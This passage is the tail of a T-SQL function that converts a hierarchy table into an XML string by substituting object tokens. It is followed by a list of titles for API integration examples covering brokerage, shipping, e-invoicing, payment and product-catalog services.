/* now we simply iterate from the root token growing each branch and leaf in each iteration. This won't be enormously quick, but it is simple to do. All values, or name/value pairs within a structure can be created in one SQL Statement*/
  WHILE 1=1
    begin
    SELECT @where= PATINDEX('%[^a-zA-Z0-9]@Object%',@XMLAsString)--find NEXT token
    if @where=0 BREAK
    /* this is slightly painful. we get the indent of the object we've found by looking backwards up the string */
    SET @indent=CHARINDEX(char(10)+char(13),Reverse(LEFT(@XMLasString,@where))+char(10)+char(13))-1
    SET @NotNumber= PATINDEX('%[^0-9]%', RIGHT(@XMLasString,LEN(@XMLAsString+'|')-@Where-8)+' ')--find NEXT token
    SET @Entities=NULL --this contains the structure in its XML form
    SELECT @Entities=COALESCE(@Entities+' ',' ')+NAME+'="'
     +REPLACE(REPLACE(REPLACE(StringValue, '<', '&lt;'), '&', '&amp;'),'>', '&gt;')
     + '"' 
       FROM @hierarchy
       WHERE parent_id= SUBSTRING(@XMLasString,@where+8, @Notnumber-1)
          AND ValueType NOT IN ('array', 'object')
    SELECT @Entities=COALESCE(@entities,''),@Objects='',@name=CASE WHEN Name='-' THEN 'root' ELSE NAME end
      FROM @hierarchy
      WHERE [Object_id]= SUBSTRING(@XMLasString,@where+8, @Notnumber-1)
   
    SELECT  @Objects=@Objects+@CrLf+SPACE(@indent+2)
           +'@Object'+CONVERT(VARCHAR(5),OBJECT_ID)
           --+@CrLf+SPACE(@indent+2)+''
      FROM @hierarchy
      WHERE parent_id= SUBSTRING(@XMLasString,@where+8, @Notnumber-1)
      AND ValueType IN ('array', 'object')
    IF @Objects='' --if it is a lef, we can do a more compact rendering
         SELECT @NewXML='<'+COALESCE(@name,'item')+@entities+' />'
    ELSE
        SELECT @NewXML='<'+COALESCE(@name,'item')+@entities+'>'
            +@Objects+@CrLf++SPACE(@indent)+'</'+COALESCE(@name,'item')+'>'
     /* basically, we just lookup the structure based on the ID that is appended to the @Object token. Simple eh? */
    --now we replace the token with the structure, maybe with more tokens in it.
    Select @XMLasString=STUFF (@XMLasString, @where+1, 8+@NotNumber-1, @NewXML)
    end
  return @XMLasString
  end



ETrade v1 Get Account Balances









ETrade v1 List Transactions









ETrade v1 View Portfolio









ETrade v1 List Orders





ETrade v1 Preview Order









ETrade v1 Place Order









HTTPS MWS List Orders (Amazon Marketplace Web Service)









MemberMouse -- getMember API Call









MWS SubmitFeed (Amazon Marketplace Web Service)









Get E-way Bill System Access Token









Generate an E-way Bill









Send DocuSign XML Request









Send SMS Messages via Route Mobile's SMSPlus REST API









Add order to a ShippingEasy account









POST GovTalk XML to https://vrep1-t.cssz.cz/VREP/submission









Adobe Analytics Reporting API (1.4)









Alabama Motor Fuel Excise Tax E-Filing SOAP XML POST (NewSubmission)









UPS Address Validation (City, State, Zip)









UPS Tracking API





UPS Rate Request





SOAP e-factura.sunat.gob.pe getStatusCdr





Google Cloud Vision Text Detection





Get Akeneo Token given Client ID and Secret





Akeneo: Get List of Products





Akeneo: Get List of Products (using StringBuilder)





Akeneo: Create New Attribute Group





Akeneo: Create New Attribute





Akeneo: Create New Family





Akeneo: Create New Product





Akeneo: Delete Product





Payeezy HMAC Computation





Yet Another SOAP MTOM POST Example





Payeezy Place Temp Authorization Hold on Buyer’s Credit Card





Verify Signature of Alexa Custom Skill Request





Send POST to Bradesco Platform with Billing Ticket for Registration





auth.fatturazioneelettronica.aruba.it GetToken





fatturazioneelettronica.aruba.it Upload File





Get SpamAssassin Score for an Email





SOAP Request to Issue Documents in Facto.cl





qa.factura1.com.co Obtain Auth Token





SOAP sendBill Call to sunat.gob.pe





SOAP Request to farmaclick.infarma.it





HMRC Validate Fraud Prevention Headers





SOAP Request to fseservicetest.sanita.finanze.it with Basic Authentication





SOAP Request to fseservicetest.sanita.finanze.it with Smart Card Authentication (TS-CNS Italian Card)





PayPal PayFlowPro - Send Transaction to Server





ISBNdb API v2 Get Book Details





POST XML to https://apicert.sii.cl/recursos/v1/boleta.electronica.token





hotelbeds.com REST API Authentication



